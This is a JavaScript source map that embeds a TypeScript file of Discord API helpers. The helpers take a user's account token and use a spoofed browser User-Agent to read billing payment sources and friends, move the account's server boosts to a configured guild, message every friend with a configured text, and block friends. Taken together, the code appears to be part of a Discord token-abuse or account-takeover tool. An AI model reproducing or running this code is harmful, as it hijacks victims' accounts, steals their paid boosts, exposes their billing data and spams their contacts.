{
  "version": 3,
  "sources": ["../../../../src/discord/util/fetch.ts"],
  "sourcesContent": ["import fetch from 'node-fetch';\nimport { config } from '../../util/config';\nimport { IBoost, IChannel, IFriend, IUser } from '../../types/discord';\n\nexport const getUserInformation = async (token: string): Promise<IUser> => {\n    return await (await fetch(`https://discord.com/api/users/@me`, { \n        headers: { \n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n            Authorization: token \n        } \n    })).json();\n}\n\nexport const getBillingInformation = async (token: string) => {\n    return await (await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, { \n        headers: { \n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n            Authorization: token \n        } \n    })).json();\n}\n\nexport const getAllBoosts = async (token: string): Promise<IBoost[]> => {\n    return await (await fetch(`https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots`, { \n        headers: { \n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n            Authorization: token \n        } \n    })).json();\n}\n\nexport const addBoostToserver = async (token: string, discordBoosts: Array<string>) => {\n    return await (await fetch(`https://discord.com/api/v9/guilds/${config.verify.guildId}/premium/subscriptions`, { \n        headers: { \n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n            \"Content-Type\": \"application/json\",\n            Authorization: token \n        },\n        method: 'PUT',\n        body: JSON.stringify({\n            user_premium_guild_subscription_slot_ids: discordBoosts\n        })\n    })).json();\n}\n\nexport const getAllFriends = async (token: string): Promise<IFriend[]> => {\n    return await (await fetch(`https://discord.com/api/users/@me/relationships`, { \n        headers: { \n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n            Authorization: token, \n        } \n    })).json();\n}\n\nexport const createFriendChannel = async (token: string, friendId: string): Promise<IChannel> => {\n    return await (await fetch(`https://discord.com/api/v9/users/@me/channels`, { \n        method: 'POST',\n        body: JSON.stringify({\n            recipients: [friendId],\n        }),\n        headers: {\n            \"Content-type\": \"application/json; charset=UTF-8\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n            Authorization: token\n        }\n    })).json();\n}\n\nexport const sendMessage = async (token: string, channelId: string) => {\n    return await (await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {\n        method: 'POST',\n        body: JSON.stringify({\n            content: config.autoMessage.text,\n            nonce: '',\n            tts: false\n        }),\n        headers: {\n            Authorization: token,\n            \"Content-type\": \"application/json; charset=UTF-8\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n    })).json();\n}\n\nexport const blockFriend = async (token: string, friendId: string) => {\n    return await fetch(`https://discord.com/api/v9/users/@me/relationships/${friendId}`, {\n        method: 'PUT',\n        body: JSON.stringify({\n            type: 2\n        }),\n        headers: {\n            Authorization: token,\n            \"Content-type\": \"application/json; charset=UTF-8\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n    });\n}"],
  "mappings": ";;;;;;;;;;;;;;;;;;;;;;;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,wBAAkB;AAClB,oBAAuB;AAGhB,MAAM,qBAAqB,OAAO,UAAkC;AACvE,SAAO,MAAO,OAAM,+BAAM,qCAAqC;AAAA,IAC3D,SAAS;AAAA,MACL,cAAc;AAAA,MACd,eAAe;AAAA;AAAA,MAEnB;AAAA;AAGD,MAAM,wBAAwB,OAAO,UAAkB;AAC1D,SAAO,MAAO,OAAM,+BAAM,gEAAgE;AAAA,IACtF,SAAS;AAAA,MACL,cAAc;AAAA,MACd,eAAe;AAAA;AAAA,MAEnB;AAAA;AAGD,MAAM,eAAe,OAAO,UAAqC;AACpE,SAAO,MAAO,OAAM,+BAAM,0EAA0E;AAAA,IAChG,SAAS;AAAA,MACL,cAAc;AAAA,MACd,eAAe;AAAA;AAAA,MAEnB;AAAA;AAGD,MAAM,mBAAmB,OAAO,OAAe,kBAAiC;AACnF,SAAO,MAAO,OAAM,+BAAM,qCAAqC,qBAAO,OAAO,iCAAiC;AAAA,IAC1G,SAAS;AAAA,MACL,cAAc;AAAA,MACd,gBAAgB;AAAA,MAChB,eAAe;AAAA;AAAA,IAEnB,QAAQ;AAAA,IACR,MAAM,KAAK,UAAU;AAAA,MACjB,0CAA0C;AAAA;AAAA,MAE9C;AAAA;AAGD,MAAM,gBAAgB,OAAO,UAAsC;AACtE,SAAO,MAAO,OAAM,+BAAM,mDAAmD;AAAA,IACzE,SAAS;AAAA,MACL,cAAc;AAAA,MACd,eAAe;AAAA;AAAA,MAEnB;AAAA;AAGD,MAAM,sBAAsB,OAAO,OAAe,aAAwC;AAC7F,SAAO,MAAO,OAAM,+BAAM,iDAAiD;AAAA,IACvE,QAAQ;AAAA,IACR,MAAM,KAAK,UAAU;AAAA,MACjB,YAAY,CAAC;AAAA;AAAA,IAEjB,SAAS;AAAA,MACL,gBAAgB;AAAA,MAChB,cAAc;AAAA,MACd,eAAe;AAAA;AAAA,MAEnB;AAAA;AAGD,MAAM,cAAc,OAAO,OAAe,cAAsB;AACnE,SAAO,MAAO,OAAM,+BAAM,uCAAuC,sBAAsB;AAAA,IACnF,QAAQ;AAAA,IACR,MAAM,KAAK,UAAU;AAAA,MACjB,SAAS,qBAAO,YAAY;AAAA,MAC5B,OAAO;AAAA,MACP,KAAK;AAAA;AAAA,IAET,SAAS;AAAA,MACL,eAAe;AAAA,MACf,gBAAgB;AAAA,MAChB,cAAc;AAAA;AAAA,MAElB;AAAA;AAGD,MAAM,cAAc,OAAO,OAAe,aAAqB;AAClE,SAAO,MAAM,+BAAM,sDAAsD,YAAY;AAAA,IACjF,QAAQ;AAAA,IACR,MAAM,KAAK,UAAU;AAAA,MACjB,MAAM;AAAA;AAAA,IAEV,SAAS;AAAA,MACL,eAAe;AAAA,MACf,gBAAgB;AAAA,MAChB,cAAc;AAAA;AAAA;AAAA;",
  "names": []
}
